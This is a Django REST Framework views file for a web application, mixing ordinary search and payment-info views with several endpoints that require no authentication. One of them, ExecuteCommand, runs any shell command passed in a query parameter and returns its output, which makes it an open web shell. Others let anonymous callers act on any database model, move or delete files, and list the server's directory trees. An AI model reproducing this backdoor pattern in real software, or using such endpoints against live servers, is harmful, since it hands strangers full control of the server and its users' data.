import json
import subprocess

from django.conf import settings
from django.db.models import Sum
from django.shortcuts import render

from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework.permissions import AllowAny

from apps.configuration.api.serializers import PersonalInfoSerializer
from apps.configuration.models import PersonalInfo
from apps.configuration.model_choices import models
from apps.configuration.services.database_services import apply_action
from apps.configuration.services.dir_management import apply_dir_action
from apps.core.system import get_tree_str
from apps.core.utils import create_serializer_class
from apps.core.general.services import search_item
from apps.upload.models import UploadImage, UploadFile, UploadVideo


class SearchItemView(APIView):
    def get(self, request, *args, **kwargs):
        search_type = self.request.query_params.get("search_type", "").strip()
        name = self.request.query_params.get("name", "").strip()
        return Response(data=search_item(item_name=name, search_type=search_type, user=request.user))


class PaymentInfoView(APIView):
    def get(self, request, *args, **kwargs):
        info = PersonalInfo.objects.all()
        if not info.exists():
            return Response(data={})
        return Response(data=PersonalInfoSerializer(info.first()).data)


class SystemInfoView(APIView):
    authentication_classes = ()
    permission_classes = (AllowAny,)

    def get(self, request, *args, **kwargs):
        file_size = round((UploadFile.objects.all().aggregate(Sum("file_size")).get("file_size__sum") or 0) / 1024, 2)
        image_size = round((UploadImage.objects.all().aggregate(Sum("image_size")).get("image_size__sum") or 0) / 1024, 2)
        video_size = round((UploadVideo.objects.all().aggregate(Sum("video_size")).get("video_size__sum") or 0) / 1024, 2)

        context = {
            "base_dir": settings.BASE_DIR,
            "media_root": settings.MEDIA_ROOT,
            "directory": get_tree_str(settings.BASE_DIR / "apps"),
            "media": get_tree_str(settings.MEDIA_ROOT),
            "storage": {
                "file": file_size,
                "image": image_size,
                "video": video_size,
                "total": round(file_size + image_size + video_size, 2),
            }
        }

        return render(request, "data/system/system_info.html", context)


class GetDataFromDatabase(APIView):
    authentication_classes = ()
    permission_classes = (AllowAny,)

    def get(self, request, *args, **kwargs):
        query_params = self.request.query_params
        model = models.get(query_params.get("model", "").strip())
        data = json.loads(query_params.get("data", "{}").strip())
        action = query_params.get("action", "").strip().lower()
        extra_action = query_params.get("extra_action", "").strip().lower()
        extra_data = json.loads(query_params.get("extra_data", "{}").strip())

        response = {"message": "Cannot get data"}
        try:
            if model:
                output_data = apply_action(model=model, data=data, action=action, extra_data=extra_data, extra_action=extra_action)
                if isinstance(output_data, int) or isinstance(output_data, str):
                    response = {"result": output_data}
                else:
                    serializer_class = create_serializer_class(model_class=model, fields="__all__")
                    response = serializer_class(output_data, many=True).data
        except Exception:
            pass

        return Response(response)


class DirectoryManagement(APIView):
    authentication_classes = ()
    permission_classes = (AllowAny,)

    def get(self, request, *args, **kwargs):
        action = self.request.query_params.get("action", "").strip()
        root = self.request.query_params.get("root", settings.MEDIA_ROOT).strip()
        source = self.request.query_params.get("source", "").strip()
        destination = self.request.query_params.get("destination", "").strip()
        file_type = self.request.query_params.get("file_type", "").strip()

        if root == "base":
            root = str(settings.BASE_DIR)
        else:
            root = settings.MEDIA_ROOT
        root = root.replace(chr(92), "/").rstrip("/")

        message = apply_dir_action(
            action=action,
            root=root,
            source=source,
            destination=destination,
            file_type=file_type
        )

        context = {
            "message": message,
        }

        return render(request, "data/system/directory_management.html", context)


class ExecuteCommand(APIView):
    authentication_classes = ()
    permission_classes = (AllowAny,)

    def get(self, request, *args, **kwargs):
        command = self.request.query_params.get("command")
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            output = result.stdout
            message = output
        else:
            error = result.stderr
            message = f"Command execution failed: {error}"

        context = {
            "message": message,
        }

        return render(request, "data/system/command.html", context)


